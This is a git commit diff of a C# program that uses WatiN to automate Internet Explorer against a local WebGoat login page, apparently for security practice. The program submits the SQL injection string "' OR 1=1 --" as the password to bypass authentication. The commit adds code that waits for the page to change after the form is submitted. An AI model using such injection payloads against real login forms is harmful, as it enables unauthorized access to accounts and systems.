d9e8afe42d83879a2ad2c8774bec23c1ca3e0f81
rodavid20 <rodavid20@yahoo.co.in>
2015-03-30 14:04:44 +0530

    updated

--- ParseHTMLWB/Form1.cs
+++ ParseHTMLWB/Form1.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Threading;
 using WatiN.Core;
 
 namespace ParseHTMLWB
@@ -14,12 +15,37 @@ namespace ParseHTMLWB
         {
             using (var browser = new IE("http://localhost:8080/WebGoat/login.mvc"))
             {
+                string beforeRequest = browser.Html;
                 browser.TextField(Find.By("type", "text")).Value ="a";
                 var passwordField = browser.TextField(Find.By("type", "password"));
                 passwordField.Value = "' OR 1=1 --";
                 WatiN.Core.Form frm = (WatiN.Core.Form)passwordField.Ancestor("form");
                 frm.Submit();
+                //browser.WaitForComplete(60);
+                string afterRequest = browser.Html;
+                while (beforeRequest == afterRequest)
+                {
+                    Thread.Sleep(200);
+                    afterRequest = browser.Html;
+                }
             }
+        }
+
+        internal static bool WaitForAsyncPostbackComplete(IE browser, int timeout)
+        {
+            int timeWaitedInMilliseconds = 0;
+            var maxWaitTimeInMilliseconds = Settings.WaitForCompleteTimeOut * 1000;
+            var scriptToCheck =
+            "Sys.WebForms.PageRequestManager.getInstance().get_isInAsyncPostBack();";
+
+            while (bool.Parse(browser.Eval(scriptToCheck)) == true
+                    && timeWaitedInMilliseconds < maxWaitTimeInMilliseconds)
+            {
+                Thread.Sleep(Settings.SleepTime);
+                timeWaitedInMilliseconds += Settings.SleepTime;
+            }
+
+            return bool.Parse(browser.Eval(scriptToCheck));
         }
     }
 }
